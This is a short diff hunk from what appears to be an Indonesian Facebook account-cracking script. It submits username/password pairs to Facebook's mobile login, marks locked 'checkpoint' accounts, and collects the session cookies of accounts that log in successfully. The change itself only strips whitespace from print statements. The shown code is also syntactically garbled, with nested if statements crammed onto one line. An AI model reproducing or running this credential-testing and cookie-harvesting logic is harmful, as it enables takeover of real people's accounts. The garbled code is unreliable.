@@ -522,8 +522,8 @@ def log_hasil(user, pasw):
     urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
     response=par(urlPost.text, "html.parser")
     if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):print("[!] Nyalakan lalu matikan mode pesawat selama 2 Detik.")
-    if "c_user" in session.cookies.get_dict():if "Akun Anda Dikunci" in urlPost.text:if self.satua==True:print(f"\r\33[1;33m[CP] {self.user} | {self.pw}								\33[37;1m\n",end="")
-      print(f"\r[×] Akun sesi new					\n\n",end="")
+    if "c_user" in session.cookies.get_dict():if "Akun Anda Dikunci" in urlPost.text:if self.satua==True:print(f"\r\33[1;33m[CP] {self.user} | {self.pw}\33[37;1m\n",end="")
+      print(f"\r[×] Akun sesi new\n\n",end="")
       else:
         aman+=1
         coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
